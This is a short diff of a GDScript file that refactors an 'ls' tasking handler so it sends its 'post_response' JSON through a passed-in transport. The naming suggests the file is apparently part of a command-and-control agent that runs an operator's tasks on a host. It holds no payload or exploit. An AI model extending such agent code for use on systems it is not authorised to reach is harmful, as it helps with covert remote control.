@@ -1,12 +1,6 @@
 extends Node
 
-var api
-
-func _ready():
-	api = $".".get_parent().get_node("api")
-
-
-func _on_tasking_ls(task):
+func _on_tasking_ls(transport, task):
 	
 	if task.has("command") and task.get("command") == "ls":
 		var test_json_conv = JSON.new()
@@ -117,7 +111,7 @@ func _on_tasking_ls(task):
 		print(ls_response)
 		print("\n\n")
 
-		api.send_agent_response(
+		transport.send(
 			JSON.stringify({
 				"action": "post_response",
 				"responses": [ls_response],
